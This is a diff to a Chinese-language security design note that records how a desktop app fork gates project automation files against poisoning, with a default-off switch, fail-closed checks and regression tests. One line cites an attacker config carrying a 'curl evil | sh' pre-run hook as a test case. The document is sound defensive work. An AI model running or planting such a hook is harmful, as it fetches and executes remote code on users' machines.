@@ -152,10 +152,27 @@ ZeroCraft 当「驾驶舱」读 Apollo 仓，**不搬运任何代码**。双方�
 
 1. **Apollo 侧守卫**：把 `.cindy/**` 纳入「只归主程改」清单 + CI 拦截，
    使普通 session 无法经该文件取得本机执行权。
-2. **ZeroCraft 侧加闸**（我们自有 fork，可改）：新增项目自动化开关（默认关），
-   或恢复「首次/变更需用户显式同意」语义。
+2. **ZeroCraft 侧加闸**（我们自有 fork，可改）：新增项目自动化开关（默认关）。
 
-**建议采用 1 + 2 并行**：Apollo 侧守卫防投毒源头，ZeroCraft 侧加闸做纵深防御。
+**采用 1 + 2 并行**：Apollo 侧守卫防投毒源头，ZeroCraft 侧加闸做纵深防御。
+
+#### ✅ 第 2 条已落地（2026-08-01）
+
+- 新增 `apps/desktop/src/main/project-automation-settings-store.ts`：项目自动化
+  总开关，**默认 `enabled: false`**；`normalize` 只认真正的 `true`，字符串
+  `"true"` / `1` / 损坏配置一律回落为关，防被投毒配置顶开闸门。
+- `ProjectAutomationLoader` 新增注入式 `isEnabled` 依赖，**收口在唯一的磁盘读取处**
+  （`readProjectAutomationsFromDisk`）——`reconcile` / `reconcileAll` /
+  `loadProjectSchedules` 全部经此，无绕过分支；关闭时视同「文件不存在」，
+  既不读盘也不同步，并清掉已落库的 project 来源日程。
+- **三重 fail-closed**：未注入 `isEnabled`、读取设置抛错、值非布尔 —— 一律按关处理。
+- 关闭时 `upsertSchedule` 明确报错，不静默写一个不会生效的文件。
+- 回归测试 `apps/desktop/src/main/scheduler-host/__tests__/projectAutomationGate.test.ts`
+  （7 条）锁死上述语义，含「攻击者配置带 `preRunHook: curl evil | sh` 时关闭状态下不被读取」。
+
+**仍待办**：第 1 条（Apollo 侧把 `.cindy/**` 纳入守卫清单）在 Apollo 仓执行；
+以及在设置 UI 里暴露该开关（当前仅有 store 与 loader 闸门，尚无界面入口，
+用户可手改 `<userData>/project-automation-settings.json`）。
 
 ---
 
